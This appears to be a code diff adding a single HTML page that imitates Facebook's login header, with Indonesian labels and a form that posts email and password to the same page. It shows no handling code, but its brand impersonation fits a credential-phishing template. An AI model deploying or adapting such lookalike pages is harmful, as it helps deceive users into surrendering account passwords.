@@ -1,0 +1,127 @@
+<html>
+	<head>
+		<title>Facebook Login</title>
+		<style>
+	/* http://meyerweb.com/eric/tools/css/reset/ 
+   v2.0 | 20110126
+   License: none (public domain)
+*/
+
+html, body, div, span, applet, object, iframe,
+h1, h2, h3, h4, h5, h6, p, blockquote, pre,
+a, abbr, acronym, address, big, cite, code,
+del, dfn, em, img, ins, kbd, q, s, samp,
+small, strike, strong, sub, sup, tt, var,
+b, u, i, center,
+dl, dt, dd, ol, ul, li,
+fieldset, form, label, legend,
+table, caption, tbody, tfoot, thead, tr, th, td,
+article, aside, canvas, details, embed, 
+figure, figcaption, footer, header, hgroup, 
+menu, nav, output, ruby, section, summary,
+time, mark, audio, video {
+	margin: 0;
+	padding: 0;
+	border: 0;
+	font-size: 100%;
+	font: inherit;
+	vertical-align: baseline;
+}
+/* HTML5 display-role reset for older browsers */
+article, aside, details, figcaption, figure, 
+footer, header, hgroup, menu, nav, section {
+	display: block;
+}
+body {
+	line-height: 1;
+}
+ol, ul {
+	list-style: none;
+}
+blockquote, q {
+	quotes: none;
+}
+blockquote:before, blockquote:after,
+q:before, q:after {
+	content: '';
+	content: none;
+}
+table {
+	border-collapse: collapse;
+	border-spacing: 0;
+}
+		
+			body{
+				margin: 0px;
+			}
+			#container{
+				width: 100%;
+			}
+			#header{
+				background-color: #3B5998;
+				height: 13%;
+			}
+			#logo{
+				float: left;
+				margin: 10px 20px;
+				padding: 10px 20px;
+				width: 10%;
+			}
+			#logo a{
+				color: #fff;
+				text-decoration: none;
+				font: 48px Sans-Serif;
+				font-weight: bold;
+			}
+			#login{
+				float: right;
+				right: 20%;
+				margin: 12px 30px;
+				padding-right: 20px;
+			}
+			#login table{
+				font: 13px Sans-Serif;
+				margin-right: 20px;
+				margin-top: 2px;
+				color: #fff;
+			}
+			#login table input{
+				border: 1px solid;
+				margin: 5px 20px 5px 0px;
+				height: 23px;
+				width: 160px;
+			}
+			#login table button{
+				background-color: #4971b2;
+				font-weight: bold;
+				border: 1px solid;
+				border-color: #0d2277;
+				color: #fff;
+				width: 65px;
+				height: 25px;
+			}
+		</style>
+	</head>
+	<body>
+		<div id="container">
+			<div id="header">
+				<div id="logo">
+					<a href="index.html">facebook</a>
+				</div>
+				<div id="login">
+					<form action="" method="POST">
+						<table >
+							<tr><td><label for="usr">Email, Nomor Telepon</label></td><td><label for="pass">Kata Sandi</label></td></tr>
+							<tr><td><input type="text" name="user" id="usr" /></td>
+							<td><input type="password" name="pass" id="pass" /></td>
+							<td><button type="submit" value="kirim"/>Masuk</td></tr>
+							<tr>
+							<td></td>
+							<td colspan=3><a href="lupa.php" style="text-decoration: none; color: #fff">Lupa Akun?</a></td></tr>
+						</table>
+					</form>
+				</div>
+			</div>
+		</div>
+	</body>
+</html>
